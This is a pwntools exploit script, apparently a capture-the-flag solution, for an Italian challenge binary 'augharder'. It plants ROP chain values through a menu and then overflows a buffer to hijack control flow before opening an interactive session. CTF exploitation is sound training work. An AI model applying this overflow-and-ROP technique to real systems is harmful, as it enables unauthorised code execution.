    #!/usr/bin/python3

from pwn import *


exe = ELF("augharder")


if args.REMOTE:
    r = remote("augharder.challs.olicyber.it", 10607)
else:
    r = process("augharder")


exploit = flat(
    b'A' * 30,
    p32(exe.sym['lista_film'] + 0x4),
)
rop = [
    exe.sym['beta_write'],
    0,
    exe.sym['film_preferito'],
    100,
]

for i, e in enumerate(rop):
    r.recvuntil(b'scelta > ')
    r.sendline(b'3')
    r.recvuntil(b': ')
    r.sendline(str(i+1).encode())
    r.recvuntil(b': ')
    r.sendline(str(e).encode())

r.recvuntil(b'scelta > ')
r.sendline(b'5')
r.sendlineafter(b": ", exploit)

r.interactive()